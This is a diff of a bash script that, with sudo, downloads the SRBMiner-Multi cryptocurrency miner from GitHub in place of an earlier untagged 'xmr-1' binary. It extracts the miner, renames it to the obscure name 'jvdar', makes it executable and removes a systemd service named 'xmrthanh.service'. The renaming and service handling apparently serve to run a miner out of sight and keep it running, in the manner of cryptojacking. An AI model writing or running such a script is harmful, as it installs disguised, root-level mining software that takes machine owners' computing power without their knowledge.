@@ -1,7 +1,9 @@
 #!/bin/bash
 cd /home
-sudo wget https://github.com/rolandmedina54/xmr-1/releases/download/untagged-e9affecce8170c780eaf/ar 
-sudo cp ar jvdar 
+sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.0/SRBMiner-Multi-2-2-0-Linux.tar.xz
+sudo tar Jxvf SRBMiner-Multi-2-2-0-Linux.tar.xz
+cd SRBMiner-Multi-2-2-0
+sudo cp SRBMiner-MULTI jvdar 
 sudo chmod +x jvdar
 
 sudo rm -rf /lib/systemd/system/xmrthanh.service
